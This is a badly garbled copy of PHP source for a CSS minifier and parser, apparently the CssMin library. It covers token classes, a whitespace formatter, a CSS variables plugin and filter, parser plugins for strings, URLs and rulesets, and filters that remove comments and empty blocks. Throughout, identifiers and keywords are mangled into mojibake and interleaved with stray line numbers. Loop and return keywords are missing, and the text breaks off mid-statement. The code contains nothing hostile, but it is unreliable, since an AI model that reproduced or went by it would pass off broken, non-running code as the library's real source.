funùiÚ
 
	`­¶y
(
¬¿y
 &
$tok’s
);

265 
	}
}

279 
ab¡¿ù
 cÏs 
	caCssFÜm©‹r


286 
´Ùeùed
 
	m$šd’t
 = " ";

292 
´Ùeùed
 
	m$·ddšg
 = 0;

298 
´Ùeùed
 
	m$tok’s
 = 
¬¿y
();

306 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
¬¿y
 
$tok’s
, 
$šd’t
 = 
nuÎ
, 
$·ddšg
 =‚ull)

308 
$this
->
tok’s
 = 
$tok’s
;

309 
$this
->
šd’t
 = !
	`is_nuÎ
(
$šd’t
) ? $indent : $this->indent;

310 
$this
->
·ddšg
 = !
	`is_nuÎ
(
$·ddšg
) ? $padding : $this->padding;

317 
ab¡¿ù
 
public
 
funùiÚ
 
	`__toSŒšg
();

318 
	}
}

330 
ab¡¿ù
 cÏs 
	caCssDeş¬©iÚTok’
 
ex‹nds
 
	maCssTok’


337 
public
 
	m$IsImpÜÁ
 = 
çl£
;

343 
public
 
	m$IsLa¡
 = 
çl£
;

349 
public
 
	m$Prİ”ty
 = "";

355 
public
 
	m$V®ue
 = "";

365 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$´İ”ty
, 
$v®ue
, 
$isImpÜÁ
 = 
çl£
, 
$isLa¡
 = false)

367 
$this
->
Prİ”ty
 = 
$´İ”ty
;

368 
$this
->
V®ue
 = 
$v®ue
;

369 
$this
->
IsImpÜÁ
 = 
$isImpÜÁ
;

370 
$this
->
IsLa¡
 = 
$isLa¡
;

377 
public
 
funùiÚ
 
	$__toSŒšg
()

379  
$this
->
Prİ”ty
 . ":" . $this->
V®ue
 . ($this->
IsImpÜÁ
 ? " !impÜÁ" : ""è. ($this->
IsLa¡
 ? "" : ";");

380 
	}
}

393 
ab¡¿ù
 cÏs 
	caCssAtBlockS¹Tok’
 
ex‹nds
 
	maCssTok’


408 
ab¡¿ù
 cÏs 
	caCssAtBlockEndTok’
 
ex‹nds
 
	maCssTok’


415 
public
 
funùiÚ
 
	$__toSŒšg
()

419 
	}
}

431 şas 
	cCssWh™esm™hsFÜm©‹r
 
ex‹nds
 
	maCssFÜm©‹r


438 
public
 
funùiÚ
 
	$__toSŒšg
()

440 
$r
 = 
	`¬¿y
();

441 
$Ëv–
 = 0;

442 
$i
 = 0, 
$l
 = 
	`couÁ
(
$this
->
tok’s
); $i < $l; $i++)

444 
$tok’
 = 
$this
->
tok’s
[
$i
];

445 
$şass
 = 
	`g‘_şass
(
$tok’
);

446 
$šd’t
 = 
	`¡r_»³©
(
$this
->
šd’t
, 
$Ëv–
);

447 ià(
$şass
 === "CssCommentToken")

449 
$lšes
 = 
	`¬¿y_m­
("Œim", 
	`ex¶ode
("\n", 
$tok’
->
Comm’t
));

450 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$lšes
); $ii < $ll; $ii++)

452 
$r
[] = 
$šd’t
 . (
	`sub¡r
(
$lšes
[
$ii
], 0, 1) == "*" ? " " : "") . $lines[$ii];

455 
	`–£if
 (
$şass
 === "CssAtCharsetToken")

457 
$r
[] = 
$šd’t
 . "@ch¬£ˆ" . 
$tok’
->
Ch¬£t
 . ";";

459 
	`–£if
 (
$şass
 === "CssAtFontFaceStartToken")

461 
$r
[] = 
$šd’t
 . "@font-face";

462 
$r
[] = 
$this
->
šd’t
 . 
$šd’t
 . "{";

463 
$Ëv–
++;

465 
	`–£if
 (
$şass
 === "CssAtImportToken")

467 
$r
[] = 
$šd’t
 . "@impÜˆ" . 
$tok’
->
ImpÜt
 . " " . 
	`im¶ode
(", ", $tok’->
MedŸTy³s
) . ";";

469 
	`–£if
 (
$şass
 === "CssAtKeyframesStartToken")

471 
$r
[] = 
$šd’t
 . "@keyäame \"" . 
$tok’
->
Name
 . "\"";

472 
$r
[] = 
$this
->
šd’t
 . 
$šd’t
 . "{";

473 
$Ëv–
++;

475 
	`–£if
 (
$şass
 === "CssAtMediaStartToken")

477 
$r
[] = 
$šd’t
 . "@medŸ " . 
	`im¶ode
(", ", 
$tok’
->
MedŸTy³s
);

478 
$r
[] = 
$this
->
šd’t
 . 
$šd’t
 . "{";

479 
$Ëv–
++;

481 
	`–£if
 (
$şass
 === "CssAtPageStartToken")

483 
$r
[] = 
$šd’t
 . "@page";

484 
$r
[] = 
$this
->
šd’t
 . 
$šd’t
 . "{";

485 
$Ëv–
++;

487 
	`–£if
 (
$şass
 === "CssAtVariablesStartToken")

489 
$r
[] = 
$šd’t
 . "@v¬ŸbË " . 
	`im¶ode
(", ", 
$tok’
->
MedŸTy³s
);

490 
$r
[] = 
$this
->
šd’t
 . 
$šd’t
 . "{";

491 
$Ëv–
++;

493 
	`–£if
 (
$şass
 === "CssRulesetStartToken" || $class === "CssAtKeyframesRulesetStartToken")

495 
$r
[] = 
$šd’t
 . 
	`im¶ode
(", ", 
$tok’
->
S–eùÜs
);

496 
$r
[] = 
$this
->
šd’t
 . 
$šd’t
 . "{";

497 
$Ëv–
++;

499 
	`–£if
 (
$şass
 == "CssAtFontFaceDeclarationToken"

500 || 
$şass
 === "CssAtKeyframesRulesetDeclarationToken"

501 || 
$şass
 === "CssAtPageDeclarationToken"

502 || 
$şass
 == "CssAtVariablesDeclarationToken"

503 || 
$şass
 === "CssRulesetDeclarationToken"

506 
$deş¬©iÚ
 = 
$šd’t
 . 
$tok’
->
Prİ”ty
 . ": ";

507 ià(
$this
->
·ddšg
)

509 
$deş¬©iÚ
 = 
	`¡r_·d
($deş¬©iÚ, 
$this
->
·ddšg
, " ", 
STR_PAD_RIGHT
);

511 
$r
[] = 
$deş¬©iÚ
 . 
$tok’
->
V®ue
 . ($tok’->
IsImpÜÁ
 ? " !important" : "") . ";";

513 
	`–£if
 (
$şass
 === "CssAtFontFaceEndToken"

514 || 
$şass
 === "CssAtMediaEndToken"

515 || 
$şass
 === "CssAtKeyframesEndToken"

516 || 
$şass
 === "CssAtKeyframesRulesetEndToken"

517 || 
$şass
 === "CssAtPageEndToken"

518 || 
$şass
 === "CssAtVariablesEndToken"

519 || 
$şass
 === "CssRulesetEndToken"

522 
$r
[] = 
$šd’t
 . "}";

523 
$Ëv–
--;

526  
	`im¶ode
("\n", 
$r
);

528 
	}
}

557 şas 
	cCssV¬ŸbËsMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


564 
´iv©e
 
	m$»M©ch
 = "/var\((.+)\)/iSU";

570 
´iv©e
 
	m$v¬ŸbËs
 = 
nuÎ
;

576 
public
 
funùiÚ
 
	$g‘V¬ŸbËs
()

578  
$this
->
v¬ŸbËs
;

586 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

588 ià(
	`¡ros
(
$tok’
->
V®ue
, "v¬"è!=ğ
çl£
 && 
	`´eg_m©ch_®l
(
$this
->
»M©ch
, $tok’->V®ue, 
$m
))

590 
$medŸTy³s
 = 
$tok’
->
MedŸTy³s
;

591 ià(!
	`š_¬¿y
("®l", 
$medŸTy³s
))

593 
$medŸTy³s
[] = "all";

595 
$i
 = 0, 
$l
 = 
	`couÁ
(
$m
[0]); $i < $l; $i++)

597 
$v¬ŸbË
 = 
	`Œim
(
$m
[1][
$i
]);

598 
	`fÜ—ch
 (
$medŸTy³s
 
as
 
$medŸTy³
)

600 ià(
	`is£t
(
$this
->
v¬ŸbËs
[
$medŸTy³
], $this->v¬ŸbËs[$medŸTy³][
$v¬ŸbË
]))

603 
$tok’
->
V®ue
 = 
	`¡r_»¶aû
(
$m
[0][
$i
], 
$this
->
v¬ŸbËs
[
$medŸTy³
][
$v¬ŸbË
], $token->Value);

608 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": NØv®ufound fÜ v¬ŸbË <code>" . 
$v¬ŸbË
 . "</code> iÀmedŸy³ <code>" . 
	`im¶ode
(", ", 
$medŸTy³s
è. "</code>", (
¡ršg
è
$tok’
));

609 
$tok’
 = 
Ãw
 
	`CssNuÎTok’
();

610  
Œue
;

613  
çl£
;

614 
	}
}

620 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

622  
¬¿y


628 
	}
}

635 
public
 
funùiÚ
 
	$£tV¬ŸbËs
(
¬¿y
 
$v¬ŸbËs
)

637 
$this
->
v¬ŸbËs
 = 
$v¬ŸbËs
;

638 
	}
}

653 şas 
	cCssV¬ŸbËsMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


661 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

663 
$v¬ŸbËs
 = 
	`¬¿y
();

664 
$deçuÉMedŸTy³s
 = 
	`¬¿y
("all");

665 
$medŸTy³s
 = 
	`¬¿y
();

666 
$»move
 = 
	`¬¿y
();

667 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

670 ià(
	`g‘_şass
(
$tok’s
[
$i
]) === "CssAtVariablesStartToken")

672 
$»move
[] = 
$i
;

673 
$medŸTy³s
 = (
	`couÁ
(
$tok’s
[
$i
]->
MedŸTy³s
è=ğ0 ? 
$deçuÉMedŸTy³s
 : $tokens[$i]->MediaTypes);

674 
	`fÜ—ch
 (
$medŸTy³s
 
as
 
$medŸTy³
)

676 ià(!
	`is£t
(
$v¬ŸbËs
[
$medŸTy³
]))

678 
$v¬ŸbËs
[
$medŸTy³
] = 
	`¬¿y
();

682 
$i
 = $i; $˜< 
$l
; $i++)

685 ià(
	`g‘_şass
(
$tok’s
[
$i
]) === "CssAtVariablesDeclarationToken")

687 
	`fÜ—ch
 (
$medŸTy³s
 
as
 
$medŸTy³
)

689 
$v¬ŸbËs
[
$medŸTy³
][
$tok’s
[
$i
]->
Prİ”ty
] = $tok’s[$i]->
V®ue
;

691 
$»move
[] = 
$i
;

694 
	`–£if
 (
	`g‘_şass
(
$tok’s
[
$i
]) === "CssAtVariablesEndToken")

696 
$»move
[] = 
$i
;

703 
	`fÜ—ch
(
$v¬ŸbËs
 
as
 
$medŸTy³
 => 
$nuÎ
)

705 
	`fÜ—ch
(
$v¬ŸbËs
[
$medŸTy³
] 
as
 
$v¬ŸbË
 => 
$v®ue
)

708 ià(
	`¡ros
(
$v®ue
, "v¬"è!=ğ
çl£
 && 
	`´eg_m©ch_®l
("/v¬\((.+)\)/iSU", $v®ue, 
$m
))

711 
$i
 = 0, 
$l
 = 
	`couÁ
(
$m
[0]); $i < $l; $i++)

713 
$v¬ŸbËs
[
$medŸTy³
][
$v¬ŸbË
] = 
	`¡r_»¶aû
(
$m
[0][
$i
], (
	`is£t
($variables[$mediaType][$m[1][$i]]) ? $variables[$mediaType][$m[1][$i]] : ""), $variables[$mediaType][$variable]);

719 
	`fÜ—ch
 (
$»move
 
as
 
$i
)

721 
$tok’s
[
$i
] = 
nuÎ
;

723 ià(!(
$¶ugš
 = 
$this
->
mšif›r
->
	`g‘Plugš
("CssVariablesMinifierPlugin")))

725 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": Th¶ugš <code>CssV¬ŸbËsMšif›rPlugš</code> wa nÙ found buˆi »quœed fÜ <code>" . 
__CLASS__
 . "</code>"));

729 
$¶ugš
->
	`£tV¬ŸbËs
(
$v¬ŸbËs
);

731  
	`couÁ
(
$»move
);

733 
	}
}

747 şas 
	cCssU¾P¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


754 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

756  
	`¬¿y
("(", ")");

763 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

765  
çl£
;

766 
	}
}

775 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

778 ià(
$ch¬
 ==ğ"(" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
 - 3, 4)è==ğ"u¾(" && 
$¡©e
 !== "T_URL")

780 
$this
->
·r£r
->
	`pushS‹
("T_URL");

781 
$this
->
·r£r
->
	`£tExşusive
(
__CLASS__
);

784 
	`–£if
 (
$ch¬
 ==ğ"\n" && 
$´eviousCh¬
 ==ğ"\\" && 
$¡©e
 === "T_URL")

786 
$this
->
·r£r
->
	`£tBufãr
(
	`sub¡r
($this->·r£r->
	`g‘Bufãr
(), 0, -2));

789 
	`–£if
 (
$ch¬
 ==ğ"\n" && 
$´eviousCh¬
 !=ğ"\\" && 
$¡©e
 === "T_URL")

791 
$lše
 = 
$this
->
·r£r
->
	`g‘Bufãr
();

792 
$this
->
·r£r
->
	`£tBufãr
(
	`sub¡r
($this->·r£r->
	`g‘Bufãr
(), 0, -1) . ")");

793 
$this
->
·r£r
->
	`pİS‹
();

794 
$this
->
·r£r
->
	`un£tExşusive
();

795 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed sŒšg†™”®", 
$lše
 . "_"));

798 
	`–£if
 (
$ch¬
 ==ğ")" && 
$¡©e
 === "T_URL")

800 
$this
->
·r£r
->
	`pİS‹
();

801 
$this
->
·r£r
->
	`un£tExşusive
();

805  
çl£
;

807  
Œue
;

808 
	}
}

823 şas 
	cCssSŒšgP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


830 
´iv©e
 
	m$d–im™”Ch¬
 = 
nuÎ
;

836 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

838  
	`¬¿y
("\"", "'", "\n");

845 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

847  
çl£
;

848 
	}
}

857 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

860 ià((
$ch¬
 ==ğ"\"" || $ch¬ ==ğ"'"è&& 
$¡©e
 !== "T_STRING")

862 
$this
->
d–im™”Ch¬
 = 
$ch¬
;

863 
$this
->
·r£r
->
	`pushS‹
("T_STRING");

864 
$this
->
·r£r
->
	`£tExşusive
(
__CLASS__
);

867 
	`–£if
 (
$ch¬
 ==ğ"\n" && 
$´eviousCh¬
 ==ğ"\\" && 
$¡©e
 === "T_STRING")

869 
$this
->
·r£r
->
	`£tBufãr
(
	`sub¡r
($this->·r£r->
	`g‘Bufãr
(), 0, -2));

872 
	`–£if
 (
$ch¬
 ==ğ"\n" && 
$´eviousCh¬
 !=ğ"\\" && 
$¡©e
 === "T_STRING")

874 
$lše
 = 
$this
->
·r£r
->
	`g‘Bufãr
();

875 
$this
->
·r£r
->
	`pİS‹
();

876 
$this
->
·r£r
->
	`un£tExşusive
();

877 
$this
->
·r£r
->
	`£tBufãr
(
	`sub¡r
($this->·r£r->
	`g‘Bufãr
(), 0, -1è. $this->
d–im™”Ch¬
);

878 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed sŒšg†™”®", 
$lše
 . "_"));

879 
$this
->
d–im™”Ch¬
 = 
nuÎ
;

882 
	`–£if
 (
$ch¬
 ==ğ
$this
->
d–im™”Ch¬
 && 
$¡©e
 === "T_STRING")

886 ià(
$´eviousCh¬
 == "\\")

888 
$sourû
 = 
$this
->
·r£r
->
	`g‘Sourû
();

889 
$c
 = 1;

890 
$i
 = 
$šdex
 - 2;

891 
	`sub¡r
(
$sourû
, 
$i
, 1) === "\\")

893 
$c
++; 
$i
--;

895 ià(
$c
 % 2)

897  
çl£
;

900 
$this
->
·r£r
->
	`pİS‹
();

901 
$this
->
·r£r
->
	`un£tExşusive
();

902 
$this
->
d–im™”Ch¬
 = 
nuÎ
;

906  
çl£
;

908  
Œue
;

909 
	}
}

922 şas 
	cCssSÜtRuË£tPrİ”t›sMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


930 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

932 
$r
 = 0;

933 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

936 ià(
	`g‘_şass
(
$tok’s
[
$i
]) !== "CssRulesetStartToken") { ; }

938 
$’dIndex
 = 
çl£
;

939 
$ii
 = 
$i
 + 1; $i˜< 
$l
; $ii++)

941 ià(
	`g‘_şass
(
$tok’s
[
$ii
]) !== "CssRulesetEndToken") { ; }

942 
$’dIndex
 = 
$ii
;

945 ià(!
$’dIndex
) { ; }

946 
$¡¬tIndex
 = 
$i
;

947 
$i
 = 
$’dIndex
;

949 ià(
$’dIndex
 - 
$¡¬tIndex
 <= 2) { ; }

951 
$ii
 = 
$¡¬tIndex
 + 1; $i˜< 
$’dIndex
; $ii++)

953 ià(
	`g‘_şass
(
$tok’s
[
$ii
]) !== "CssRulesetDeclarationToken") { (2); }

955 
$deş¬©iÚs
 = 
	`¬¿y_¦iû
(
$tok’s
, 
$¡¬tIndex
 + 1, 
$’dIndex
 - $startIndex - 1);

957 
$sÜtRequœed
 = 
$Ï¡Prİ”tyName
 = 
çl£
;

958 
	`fÜ—ch
 (
$deş¬©iÚs
 
as
 
$deş¬©iÚ
)

960 ià(
$Ï¡Prİ”tyName
)

962 ià(
	`¡rcmp
(
$Ï¡Prİ”tyName
, 
$deş¬©iÚ
->
Prİ”ty
) > 0)

964 
$sÜtRequœed
 = 
Œue
;

968 
$Ï¡Prİ”tyName
 = 
$deş¬©iÚ
->
Prİ”ty
;

970 ià(!
$sÜtRequœed
) { ; }

972 
	`usÜt
(
$deş¬©iÚs
, 
	`¬¿y
(
__CLASS__
, "userDefinedSort1"));

974 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$deş¬©iÚs
) - 1; $ii <= $ll; $ii++)

976 ià(
$ii
 =ğ
$Î
)

978 
$deş¬©iÚs
[
$ii
]->
IsLa¡
 = 
Œue
;

982 
$deş¬©iÚs
[
$ii
]->
IsLa¡
 = 
çl£
;

986 
	`¬¿y_¥liû
(
$tok’s
, 
$¡¬tIndex
 + 1, 
$’dIndex
 - $¡¬tIndex - 1, 
$deş¬©iÚs
);

987 
$r
 +ğ
$’dIndex
 - 
$¡¬tIndex
 - 1;

989  
$r
;

996 
public
 
funùiÚ
 
	$u£rDefšedSÜt1
(
$a
, 
$b
)

998  
	`¡rcmp
(
$a
->
Prİ”ty
, 
$b
->Property);

999 
	}
}

1012 şas 
	cCssRuË£tS¹Tok’
 
ex‹nds
 
	maCssRuË£tS¹Tok’


1019 
public
 
	m$S–eùÜs
 = 
¬¿y
();

1026 
public
 
funùiÚ
 
__cÚ¡ruù
(
¬¿y
 
$£ËùÜs
 = 
	$¬¿y
())

1028 
$this
->
S–eùÜs
 = 
$£ËùÜs
;

1035 
public
 
funùiÚ
 
	$__toSŒšg
()

1037  
	`im¶ode
(",", 
$this
->
S–eùÜs
) . "{";

1038 
	}
}

1054 şas 
	cCssRuË£tP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


1061 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

1063  
	`¬¿y
(",", "{", "}", ":", ";");

1070 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

1072  
	`¬¿y
("T_DOCUMENT", "T_AT_MEDIA", "T_RULESET::SELECTORS", "T_RULESET", "T_RULESET_DECLARATION");

1073 
	}
}

1079 
´iv©e
 
	g$£ËùÜs
 = 
¬¿y
();

1088 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

1091 ià(
$ch¬
 ==ğ"," && (
$¡©e
 === "T_DOCUMENT" || $state === "T_AT_MEDIA" || $state === "T_RULESET::SELECTORS"))

1093 ià(
$¡©e
 !== "T_RULESET::SELECTORS")

1095 
$this
->
·r£r
->
	`pushS‹
("T_RULESET::SELECTORS");

1097 
$this
->
£ËùÜs
[] = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(",{");

1100 
	`–£if
 (
$ch¬
 ==ğ"{" && (
$¡©e
 === "T_DOCUMENT" || $state === "T_AT_MEDIA" || $state === "T_RULESET::SELECTORS"))

1102 ià(
$this
->
·r£r
->
	`g‘Bufãr
() !== "")

1104 
$this
->
£ËùÜs
[] = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(",{");

1105 ià(
$¡©e
 == "T_RULESET::SELECTORS")

1107 
$this
->
·r£r
->
	`pİS‹
();

1109 
$this
->
·r£r
->
	`pushS‹
("T_RULESET");

1110 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssRuË£tS¹Tok’
($this->
£ËùÜs
));

1111 
$this
->
£ËùÜs
 = 
	`¬¿y
();

1115 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_RULESET")

1117 
$this
->
·r£r
->
	`pushS‹
("T_RULESET_DECLARATION");

1118 
$this
->
bufãr
 = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(":;", 
Œue
);

1121 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_RULESET_DECLARATION")

1124 ià(
$this
->
bufãr
 === "filter")

1126  
çl£
;

1128 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed deş¬©iÚ", 
$this
->
bufãr
 . ":" . $this->
·r£r
->
	`g‘Bufãr
() . "_"));

1131 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"}"è&& 
$¡©e
 === "T_RULESET_DECLARATION")

1133 
$v®ue
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
(";}");

1134 ià(
	`¡¹Şow”
(
	`sub¡r
(
$v®ue
, -10, 10)) === "!important")

1136 
$v®ue
 = 
	`Œim
(
	`sub¡r
($value, 0, -10));

1137 
$isImpÜÁ
 = 
Œue
;

1141 
$isImpÜÁ
 = 
çl£
;

1143 
$this
->
·r£r
->
	`pİS‹
();

1144 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
($this->
bufãr
, 
$v®ue
, $this->·r£r->
	`g‘MedŸTy³s
(), 
$isImpÜÁ
));

1146 ià(
$ch¬
 === "}")

1148 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssRuË£tEndTok’
());

1149 
$this
->
·r£r
->
	`pİS‹
();

1151 
$this
->
bufãr
 = "";

1154 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_RULESET")

1156 
$this
->
·r£r
->
	`pİS‹
();

1157 
$this
->
·r£r
->
	`ş—rBufãr
();

1158 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssRuË£tEndTok’
());

1159 
$this
->
bufãr
 = "";

1160 
$this
->
£ËùÜs
 = 
	`¬¿y
();

1164  
çl£
;

1166  
Œue
;

1167 
	}
}

1180 şas 
	cCssRuË£tEndTok’
 
ex‹nds
 
	maCssRuË£tEndTok’


1195 şas 
	cCssRuË£tDeş¬©iÚTok’
 
ex‹nds
 
	maCssDeş¬©iÚTok’


1202 
public
 
	m$MedŸTy³s
 = 
¬¿y
("all");

1213 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$´İ”ty
, 
$v®ue
, 
$medŸTy³s
 = 
nuÎ
, 
$isImpÜÁ
 = 
çl£
, 
$isLa¡
 = false)

1215 
·»Á
::
	`__cÚ¡ruù
(
$´İ”ty
, 
$v®ue
, 
$isImpÜÁ
, 
$isLa¡
);

1216 
$this
->
MedŸTy³s
 = 
$medŸTy³s
 ? $medŸTy³ : 
	`¬¿y
("all");

1218 
	}
}

1232 şas 
	cCssRemoveLa¡D–¬©iÚSemiCŞÚMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


1240 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

1242 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

1244 
$cu¼’t
 = 
	`g‘_şass
(
$tok’s
[
$i
]);

1245 
$Ãxt
 = 
	`is£t
(
$tok’s
[
$i
+1]è? 
	`g‘_şass
($tok’s[$i+1]è: 
çl£
;

1246 ià((
$cu¼’t
 ==ğ"CssRuË£tDeş¬©iÚTok’" && 
$Ãxt
 === "CssRulesetEndToken") ||

1247 (
$cu¼’t
 ==ğ"CssAtFÚtFaûDeş¬©iÚTok’" && 
$Ãxt
 === "CssAtFontFaceEndToken") ||

1248 (
$cu¼’t
 ==ğ"CssAtPageDeş¬©iÚTok’" && 
$Ãxt
 === "CssAtPageEndToken"))

1250 
$tok’s
[
$i
]->
IsLa¡
 = 
Œue
;

1255 
	}
}

1268 şas 
	cCssRemoveEm±yRuË£tsMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


1276 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

1278 
$r
 = 0;

1279 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

1281 
$cu¼’t
 = 
	`g‘_şass
(
$tok’s
[
$i
]);

1282 
$Ãxt
 = 
	`is£t
(
$tok’s
[
$i
 + 1]è? 
	`g‘_şass
($tok’s[$˜+ 1]è: 
çl£
;

1283 ià((
$cu¼’t
 ==ğ"CssRuË£tS¹Tok’" && 
$Ãxt
 === "CssRulesetEndToken") ||

1284 (
$cu¼’t
 ==ğ"CssAtKeyäamesRuË£tS¹Tok’" && 
$Ãxt
 ==ğ"CssAtKeyäamesRuË£tEndTok’" && !
	`¬¿y_š‹r£ù
(
	`¬¿y
("äom", "0%", "to", "100%"), 
	`¬¿y_m­
("¡¹Şow”", 
$tok’s
[
$i
]->
S–eùÜs
)))

1287 
$tok’s
[
$i
] = 
nuÎ
;

1288 
$tok’s
[
$i
 + 1] = 
nuÎ
;

1289 
$i
++;

1290 
$r
 = $r + 2;

1293  
$r
;

1295 
	}
}

1308 şas 
	cCssRemoveEm±yAtBlocksMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


1316 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

1318 
$r
 = 0;

1319 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

1321 
$cu¼’t
 = 
	`g‘_şass
(
$tok’s
[
$i
]);

1322 
$Ãxt
 = 
	`is£t
(
$tok’s
[
$i
 + 1]è? 
	`g‘_şass
($tok’s[$˜+ 1]è: 
çl£
;

1323 ià((
$cu¼’t
 ==ğ"CssAtFÚtFaûS¹Tok’" && 
$Ãxt
 === "CssAtFontFaceEndToken") ||

1324 (
$cu¼’t
 ==ğ"CssAtKeyäamesS¹Tok’" && 
$Ãxt
 === "CssAtKeyframesEndToken") ||

1325 (
$cu¼’t
 ==ğ"CssAtPageS¹Tok’" && 
$Ãxt
 === "CssAtPageEndToken") ||

1326 (
$cu¼’t
 ==ğ"CssAtMedŸS¹Tok’" && 
$Ãxt
 === "CssAtMediaEndToken"))

1328 
$tok’s
[
$i
] = 
nuÎ
;

1329 
$tok’s
[
$i
 + 1] = 
nuÎ
;

1330 
$i
++;

1331 
$r
 = $r + 2;

1334  
$r
;

1336 
	}
}

1348 şas 
	cCssRemoveComm’tsMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


1356 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

1358 
$r
 = 0;

1359 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

1361 ià(
	`g‘_şass
(
$tok’s
[
$i
]) === "CssCommentToken")

1363 
$tok’s
[
$i
] = 
nuÎ
;

1364 
$r
++;

1367  
$r
;

1369 
	}
}

1381 şas 
	cCssP¬£r


1388 
´iv©e
 
	m$bufãr
 = "";

1394 
´iv©e
 
	m$¶ugšs
 = 
¬¿y
();

1400 
´iv©e
 
	m$sourû
 = "";

1406 
´iv©e
 
	m$¡©e
 = "T_DOCUMENT";

1412 
´iv©e
 
	m$¡©eExşusive
 = 
çl£
;

1418 
´iv©e
 
	m$¡©eMedŸTy³s
 = 
çl£
;

1424 
´iv©e
 
	m$¡©es
 = 
¬¿y
("T_DOCUMENT");

1430 
´iv©e
 
	m$tok’s
 = 
¬¿y
();

1440 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$sourû
 = 
nuÎ
, 
¬¿y
 
$¶ugšs
 =‚ull)

1442 
$¶ugšs
 = 
	`¬¿y_m”ge
(
¬¿y


1444 "Comm’t" => 
Œue
,

1445 "SŒšg" => 
Œue
,

1446 "U¾" => 
Œue
,

1447 "Ex´essiÚ" => 
Œue
,

1448 "RuË£t" => 
Œue
,

1449 "AtCh¬£t" => 
Œue
,

1450 "AtFÚtFaû" => 
Œue
,

1451 "AtImpÜt" => 
Œue
,

1452 "AtKeyäames" => 
Œue
,

1453 "AtMedŸ" => 
Œue
,

1454 "AtPage" => 
Œue
,

1455 "AtV¬ŸbËs" => 
Œue


1456 ), 
	`is_¬¿y
(
$¶ugšs
è? $¶ugš : 
	`¬¿y
());

1458 
	`fÜ—ch
 (
$¶ugšs
 
as
 
$Çme
 => 
$cÚfig
)

1460 ià(
$cÚfig
 !=ğ
çl£
)

1462 
$şass
 = "Css" . 
$Çme
 . "ParserPlugin";

1463 
$cÚfig
 = 
	`is_¬¿y
($cÚfigè? $cÚfig : 
	`¬¿y
();

1464 ià(
	`şass_exi¡s
(
$şass
))

1466 
$this
->
¶ugšs
[] = 
Ãw
 
	`$şass
($this, 
$cÚfig
);

1470 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": Th¶ugš <code>" . 
